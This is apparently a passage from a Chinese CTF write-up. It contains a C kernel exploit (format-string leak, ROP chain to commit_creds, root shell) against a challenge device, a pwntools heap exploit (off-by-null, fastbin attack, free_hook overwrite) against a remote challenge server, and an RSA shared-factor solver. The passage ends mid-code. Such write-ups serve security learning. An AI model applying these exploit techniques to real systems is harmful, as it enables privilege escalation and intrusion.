<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kalloc	0x73311337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kfree	0x13377331</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> printk	0xDEADBEEF</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_off	0x81790</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_off	0x81410</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret	0x3a591c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_rdi_cr4	0x4e5b1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_ret	0x44f17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mv_rax_in_rdx	0x6b31</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_quit</span><span class="params">(<span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	perror(p);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span> *);</span><br><span class="line"><span class="keyword">void</span> (*prepare_kernel_cred)(<span class="keyword">void</span> *);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">(<span class="keyword">int</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,fd,t[<span class="number">0x100</span>];</span><br><span class="line">	<span class="keyword">char</span> p[<span class="number">0x2008</span>];</span><br><span class="line">	signal(SIGSEGV, get_root);</span><br><span class="line">	<span class="keyword">char</span> *leak = <span class="string">"%lx %lx %lx %lx %lx kernel:0x%lx %lx %lx %lx stack:0x%lx %lx %lx %lx %lx aa\n"</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> kernel;</span><br><span class="line">        <span class="keyword">if</span> ((fd = open(<span class="string">"/dev/meizijiutql"</span>,O_RDWR)) == <span class="number">-1</span>)</span><br><span class="line">		error_quit(<span class="string">"open error"</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x103</span>; i++)</span><br><span class="line">		ioctl(fd, kalloc, <span class="number">0xff9</span>);</span><br><span class="line">	write(fd, leak, <span class="built_in">strlen</span>(leak));</span><br><span class="line">	ioctl(fd, printk, <span class="number">0</span>);</span><br><span class="line">	ioctl(fd, printk, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"input kernel_base\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%lx"</span>,&amp;kernel);</span><br><span class="line">	kernel = kernel &amp; <span class="number">0xfffffffffff00000</span>;</span><br><span class="line">	kernel -= <span class="number">0x100000</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"input stack_addr\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%lx"</span>,&amp;<span class="built_in">stack</span>);</span><br><span class="line">	<span class="built_in">stack</span> = <span class="built_in">stack</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">	*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;p[<span class="number">0x1000</span>]) = <span class="built_in">stack</span>;</span><br><span class="line">	write(fd, p, <span class="number">0x1008</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p,<span class="number">0x90</span>,<span class="number">0x2000</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *rop = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;p[<span class="number">0xe50</span><span class="number">-8</span>];</span><br><span class="line">	i = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"0x%lx\n"</span>,pop_rdi_ret+kernel);</span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line">	rop[i++] = pop_rdi_ret + kernel;</span><br><span class="line">	rop[i++] = <span class="number">0</span>;</span><br><span class="line">	rop[i++] = prepare_off + kernel;</span><br><span class="line">	rop[i++] = pop_rdx_ret + kernel;</span><br><span class="line">	rop[i++] = <span class="built_in">stack</span> + <span class="number">0xe80</span>;</span><br><span class="line">	rop[i++] = mv_rax_in_rdx + kernel;</span><br><span class="line">	rop[i++] = pop_rdi_ret + kernel;</span><br><span class="line">	rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">	rop[i++] = commit_off + kernel;</span><br><span class="line">	rop[i++] = <span class="number">0xa00d5a</span> + kernel;</span><br><span class="line">	rop[i++] = <span class="number">0x246</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x021880</span> + kernel;</span><br><span class="line">	rop[i++] = get_root;</span><br><span class="line">	rop[i++] = <span class="number">0x33</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x246</span>;</span><br><span class="line">	rop[i++] = p;</span><br><span class="line">	rop[i++] = <span class="number">0x2b</span>;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">0x700</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ioctl(fd, kalloc, <span class="number">0xff9</span>);</span><br><span class="line">		write(fd, p, <span class="number">0x1000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二手旧电脑"><a href="#二手旧电脑" class="headerlink" title="二手旧电脑"></a>二手旧电脑</h2><p>这道题比较简单</p>
<p>漏洞很明显，off by null</p>
<p>利用 off by null 可以控制其他chunk</p>
<p>然后再fastbin attack到heap第一个chunk那里</p>
<p>再利用题目给的rename，就可以进行任意写，写到free_hook为system，然后就可以了</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'47.111.59.243'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(sz,name,price)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'length: '</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'Name: '</span>)</span><br><span class="line">    se(name)</span><br><span class="line">    ru(<span class="string">'Price: '</span>)</span><br><span class="line">    sl(str(price))</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment</span><span class="params">(idx,content,score)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Comment on'</span>)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(<span class="string">'score:'</span>)</span><br><span class="line">    sl(str(score))</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">throw</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Comment '</span>)</span><br><span class="line">    data = ru(<span class="string">' will'</span>)[:<span class="number">-5</span>]</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">'a\n'</span>,<span class="number">100</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'a\n'</span>,<span class="number">200</span>)</span><br><span class="line">comment(<span class="number">0</span>,<span class="string">'aaaa\n'</span>,<span class="number">100</span>)</span><br><span class="line">throw(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a\n'</span>,<span class="number">100</span>)</span><br><span class="line">comment(<span class="number">0</span>,<span class="string">'a'</span>,<span class="number">100</span>)</span><br><span class="line">libc = u32(throw(<span class="number">0</span>)[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    base = libc<span class="number">-0x1b27b0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    base = libc<span class="number">-0x1b07b0</span></span><br><span class="line"></span><br><span class="line">throw(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">'c'</span>*<span class="number">20</span>+<span class="string">'\n'</span>,<span class="number">100</span>)</span><br><span class="line">throw(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="string">'wwwww\n'</span>,<span class="number">100</span>)</span><br><span class="line">comment(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">heap = u32(throw(<span class="number">0</span>)[<span class="number">0x10</span>:<span class="number">0x14</span>])<span class="number">-0x48</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">'a\n'</span>,<span class="number">100</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    throw(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'b\n'</span>,<span class="number">200</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">'a\n'</span>,<span class="number">100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'a\n'</span>,<span class="number">100</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'b\n'</span>,<span class="number">200</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'c\n'</span>,<span class="number">300</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">throw(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xfc</span>,(p32(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">0xf1</span>)+p32(heap+<span class="number">0x288</span>)+p32(heap+<span class="number">0x288</span>)+p32(heap+<span class="number">0x278</span>)*<span class="number">4</span>).ljust(<span class="number">0xf8</span>,<span class="string">'a'</span>)+p32(<span class="number">0xf0</span>),<span class="number">200</span>) <span class="comment">#2</span></span><br><span class="line">throw(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xec</span>,<span class="string">'a\n'</span>,<span class="number">100</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'b\n'</span>,<span class="number">200</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">throw(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x2c</span>,<span class="string">'qqqqqq\n'</span>,<span class="number">100</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xbc</span>,<span class="string">'a\n'</span>,<span class="number">100</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">throw(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">throw(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook =  base + 0x1b38b0</span></span><br><span class="line">free_hook = base + <span class="number">0x1b18b0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xfc</span>,p32(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">0x31</span>)+p32(heap)+<span class="string">'\n'</span>,<span class="number">100</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x2c</span>,p32(<span class="number">0</span>)+p32(heap+<span class="number">0x8</span>)+p32(<span class="number">0</span>)+p32(free_hook)+p32(<span class="number">0</span>)+p32(heap+<span class="number">0x298</span>)+<span class="string">'/bin/sh\0'</span>+<span class="string">'\n'</span>,<span class="number">100</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x2c</span>,p32(heap+<span class="number">0x290</span>)+p32(heap+<span class="number">0x280</span>)+<span class="string">'\n'</span>,<span class="number">100</span>) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">'4'</span>)</span><br><span class="line">ru(<span class="string">'Give me an index: '</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">se(p32(heap+<span class="number">0x290</span>)+p32(heap+<span class="number">0x288</span>))</span><br><span class="line">ru(<span class="string">'Wanna get more power?(y/n)'</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'y'</span>)</span><br><span class="line">ru(<span class="string">'Give me serial:'</span>)</span><br><span class="line">se(<span class="string">'e4SyD1C!'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="comment">#se('a'+p32(base+0x3ada0))</span></span><br><span class="line">se(<span class="string">'a'</span>+p32(base+<span class="number">0x3a940</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(free_hook))</span><br><span class="line">print(hex(base))</span><br><span class="line">print(hex(heap))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Prime"><a href="#Prime" class="headerlink" title="Prime"></a>Prime</h2><p>题目给出4个N，不知道是咋生成的</p>
<p>瞎试，发现n0 n1不互质，后来发现任意两个都不互质，然后就能求出每个n的四个因子。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> a &lt; b:</span><br><span class="line">     a, b = b, a</span><br><span class="line">   <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">     temp = a % b</span><br><span class="line">     a = b</span><br><span class="line">     b = temp</span><br><span class="line">   <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">"0123456789abcdefABCDEF"</span></span><br><span class="line">p = remote(<span class="string">"47.111.59.243"</span>,<span class="string">"8003"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"[*] Please find a string that md5(str + "</span>)</span><br><span class="line">salt = p.recv(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"[0:5] == "</span>)</span><br><span class="line">part_hash = p.recv(<span class="number">5</span>)</span><br><span class="line">found = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> s:</span><br><span class="line">                    ss = i+j+k+l+m</span><br><span class="line">                    <span class="keyword">if</span> md5(ss+salt).hexdigest()[:<span class="number">5</span>] == part_hash:</span><br><span class="line">                        found = <span class="number">1</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> found:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> found:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(ss)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"cs[0] = "</span>)</span><br><span class="line">c1 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"ns[0] = "</span>)</span><br><span class="line">n1 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"cs[1] = "</span>)</span><br><span class="line">c2 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"ns[1] = "</span>)</span><br><span class="line">n2 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"cs[2] = "</span>)</span><br><span class="line">c3 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"ns[2] = "</span>)</span><br><span class="line">n3 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"cs[3] = "</span>)</span><br><span class="line">c4 = eval(p.recvline())</span><br><span class="line">p.recvuntil(<span class="string">"ns[3] = "</span>)</span><br><span class="line">n4 = eval(p.recvline())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n1p1 = gcd(n1,n2)</span><br><span class="line">n1p2 = gcd(n1,n3)</span><br><span class="line">n1p3 = gcd(n1,n4)</span><br><span class="line">n1p4 = n1/(n1p1*n1p2*n1p3)</span><br><span class="line">d1=int(gmpy2.invert(n1,(n1p1<span class="number">-1</span>)*(n1p2<span class="number">-1</span>)*(n1p3<span class="number">-1</span>)*(n1p4<span class="number">-1</span>)))</span><br><span class="line">m1 = pow(c1,d1,n1)</span><br><span class="line"></span><br><span class="line">n2p1 = gcd(n2,n1)</span><br><span class="line">n2p2 = gcd(n2,n3)</span><br><span class="line">n2p3 = gcd(n2,n4)</span><br><span class="line">n2p4 = n2/(n2p1*n2p2*n2p3)</span><br><span class="line">d2=int(gmpy2.invert(n2,(n2p1<span class="number">-1</span>)*(n2p2<span class="number">-1</span>)*(n2p3<span class="number">-1</span>)*(n2p4<span class="number">-1</span>)))</span><br><span class="line">m2 = pow(c2,d2,n2)</span><br><span class="line"></span><br><span class="line">n3p1 = gcd(n3,n1)</span><br><span class="line">n3p2 = gcd(n3,n2)</span><br><span class="line">n3p3 = gcd(n3,n4)</span><br><span class="line">n3p4 = n3/(n3p1*n3p2*n3p3)</span><br><span class="line">d3=int(gmpy2.invert(n3,(n3p1<span class="number">-1</span>)*(n3p2<span class="number">-1</span>)*(n3p3<span class="number">-1</span>)*(n3p4<span class="number">-1</span>)))</span><br><span class="line">m3 = pow(c3,d3,n3)</span><br><span class="line"></span><br><span class="line">n4p1 = gcd(n4,n2)</span><br><span class="line">n4p2 = gcd(n4,n3)</span><br><span class="line">n4p3 = gcd(n4,n1)</span><br><span class="line">n4p4 = n4/(n4p1*n4p2*n4p3)</span><br><span class="line">d4=int(gmpy2.invert(n4,(n4p1<span class="number">-1</span>)*(n4p2<span class="number">-1</span>)*(n4p3<span class="number">-1</span>)*(n4p4<span class="number">-1</span>)))</span><br><span class="line">m4 = pow(c4,d4,n4)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"ms[0] = "</span>)</span><br><span class="line">p.sendline(hex(m1))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"ms[1] = "</span>)</span><br><span class="line">p.sendline(hex(m2))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"ms[2] = "</span>)</span><br><span class="line">p.sendline(hex(m3))</span><br><span class="line"></span><br><span 